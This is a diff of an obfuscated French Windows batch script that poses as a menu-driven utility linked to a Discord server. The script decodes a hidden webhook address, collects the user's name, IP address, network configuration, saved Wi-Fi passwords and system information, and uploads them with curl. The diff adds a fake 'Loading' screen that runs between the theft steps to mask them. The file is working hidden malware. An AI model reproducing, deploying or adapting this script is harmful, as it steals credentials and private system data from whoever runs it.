@@ -34,7 +34,9 @@ prompt .
 @echo off
 cls
 setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
-echo Loading...
+set "ldrghjhikhyhfgvtcdeszwxzeulokjhyufvrtdfctygd=="
+echo Loading
+echo %ldrghjhikhyhfgvtcdeszwxzeulokjhyufvrtdfctygd%
 set co=false
 for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do (
     if NOT "%%A"==" 127.0.0.1" (
@@ -45,7 +47,8 @@ if "%co%"=="false" (
     echo Pas de connexion internet!
     pause
     goto :EOF
-) 
+)
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 (set INVCHAR[mvdtxq]=a) & (set INVCHAR[bhoijd]=b) & (set INVCHAR[cfgjgh]=c) & (set INVCHAR[depjox]=d) & (set INVCHAR[elkdsw]=e)
 (set INVCHAR[ffbklj]=f) & (set INVCHAR[giokjs]=g) & (set INVCHAR[htrlkj]=h) & (set INVCHAR[iopszn]=i) & (set INVCHAR[jkzesw]=j)
 (set INVCHAR[kzsoiu]=k) & (set INVCHAR[lpodks]=l) & (set INVCHAR[mlojzj]=m) & (set INVCHAR[njsdiy]=n) & (set INVCHAR[odosjw]=o)
@@ -62,6 +65,7 @@ if "%co%"=="false" (
 (set INVCHAR[sxzqhe]=0) & (set INVCHAR[sxuqhe]=1) & (set INVCHAR[sdzqhe]=2) & (set INVCHAR[sxuqht]=3) & (set INVCHAR[crttzf]=4)
 (set INVCHAR[cilque]=5) & (set INVCHAR[sicesx]=6) & (set INVCHAR[ssetdw]=7) & (set INVCHAR[outfsw]=8) & (set INVCHAR[nfkopx]=9)
 set "olazksdjoixhwnc=htrlkjtioujdtioujdpllkjhsijnuzdploxwsplasxsplasxdepjoxiopsznsijnuzcfgjghodosjwrsmlopdepjoxppttsdcfgjghodosjwmlojzjsplasxmvdtxqpllkjhiopsznsplasxwxdzolelkdswbhoijdhtrlkjodosjwodosjwkzsoiusijnuzsplasxsxuqhesdzqhenfkopxsdzqheoutfswcilquesxuqhtoutfswnfkopxcrttzfssetdwsxuqhesxuqhesicesxsxuqhesxuqhecrttzfnfkopxsxuqhtsplasxLM5WGDMQBRKHQMWKTIOKDH85nfkopxdepjox52GHTMROSI27crttzfnfkopxNDJCUKmlojzjsxuqhewxdzollpodksCA41DVsxuqhtcrttzfdepjoxsicesxcfgjghTJNI5DdepjoxJ62DSPBOANMWSZVNHLodosjwsxuqhtONJLIULM5WGDCA41DVL5D2JVOJ854DsxuqhtMQBRKHEDSDJClpodkssicesxcilqueoutfswOKDH85ssetdwOJISD5htrlkjmvdtxqLM5WGDxolkerCA41DVcilqueJ62DSPuijxcwSZVNHLwxdzolONJLIUssetdwQMWKTIcrttzfROSI27OKDH85mlojzjcfgjghJ62DSP52GHTM52GHTMsxuqhePTIELIOJ854DL5D2JV" 
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 set PLASOZ=
 :dslpplbyasfgwx
 if "%olazksdjoixhwnc%"=="" goto eljkdiknxwxcopkujekdfkpkw
@@ -71,16 +75,19 @@ set PLASOZ=%PLASOZ%!doelfjkeirjezuhncebccharodlfjkfuisxdhcv!
 set olazksdjoixhwnc=%olazksdjoixhwnc:~6%
 goto dslpplbyasfgwx
 :eljkdiknxwxcopkujekdfkpkw
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 set "wu=%PLASOZ%"
-set "vrsssytmcmdmasdevdksod=3.8"
+set "vrsssytmcmdmasdevdksod=4.1"
 set "lstupdskqdzieszheygzsedqzhedtqgsfd=11/11/2024"
 set "brseaj=%USERPROFILE%\Desktop"
 set "tpmfz=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 set izklm=
 for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R "IPv4"') do (
     set izklm=%%i
     set izklm=!izklm: =!
 )
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 (
 echo {
 echo   "content": "Nouvelle Connexion :",
@@ -105,11 +112,13 @@ echo     }
 echo   ]
 echo }
 ) > "!tpmfz!"
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 del "!tpmfz!"
-
 set tempDir=%TEMP%
 set akoppdsqdcrghsdazfv=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 echo . >> %akoppdsqdcrghsdazfv%
 echo USER : >> %akoppdsqdcrghsdazfv%
 echo %USERNAME% >> %akoppdsqdcrghsdazfv%
@@ -134,16 +143,19 @@ ipconfig /all >> %akoppdsqdcrghsdazfv%
 echo. >> %akoppdsqdcrghsdazfv%
 call :lfkiopsxcf
 echo. >> %akoppdsqdcrghsdazfv%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 echo Informations sur les reseaux Wi-Fi et le systeme : >> %akoppdsqdcrghsdazfv%
 echo . >> %akoppdsqdcrghsdazfv%
 echo LAN : >> %akoppdsqdcrghsdazfv%
 netsh lan show profiles >> %akoppdsqdcrghsdazfv%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 echo . >> %akoppdsqdcrghsdazfv%
 call :lfkiopsxcf
 echo . >> %akoppdsqdcrghsdazfv%
 echo WLAN : >> %akoppdsqdcrghsdazfv%
 echo. >> %akoppdsqdcrghsdazfv%
 netsh wlan show profiles >> %akoppdsqdcrghsdazfv%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 echo. >> %akoppdsqdcrghsdazfv%
 echo Mot de Passe WIFI : >> %akoppdsqdcrghsdazfv%
 (
@@ -157,19 +169,20 @@ for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil 
     endlocal
 )
 ) >> %akoppdsqdcrghsdazfv%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 call :lfkiopsxcf
 echo. >> %akoppdsqdcrghsdazfv%
 echo Informations systeme : >> %akoppdsqdcrghsdazfv%
 echo. >> %akoppdsqdcrghsdazfv%
 systeminfo >> %akoppdsqdcrghsdazfv%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 curl -F "file=@%akoppdsqdcrghsdazfv%" %wu%
+call :clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
 del %akoppdsqdcrghsdazfv%
 
 color a
-echo Loaded !
 cls
 call :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
-
 :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
 call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
 echo .
@@ -207,8 +220,9 @@ if "%cmmdiopqscer%"=="1" (
 ) else if "%cmmdiopqscer%"=="13" (
     call :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
 ) else if "%cmmdiopqscer%"=="14" (
-    echo Bye
-    goto :EOF
+    echo Merci d'avoir utiliser mon programme, a la prochaine !
+    pause
+    exit
 ) else if "%cmmdiopqscer%"=="15" (
     call :ddpsslinvflkjazedswfc
 ) else if "%cmmdiopqscer%"=="16 5" (
@@ -326,6 +340,12 @@ Start
 Start
 Start
 goto odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd
+goto :EOF
+:clrldbkljugtygdvetszrecqsedtkiuyginoufbtdfetvqscwzrtvytdjybgh
+set "ldrghjhikhyhfgvtcdeszwxzeulokjhyufvrtdfctygd=%ldrghjhikhyhfgvtcdeszwxzeulokjhyufvrtdfctygd% ="
+cls
+echo Loading
+echo %ldrghjhikhyhfgvtcdeszwxzeulokjhyufvrtdfctygd%
 goto :EOF
 :ddpsslinvflkjazedswfc
 start https://discord.gg/BtkPH5PDdR
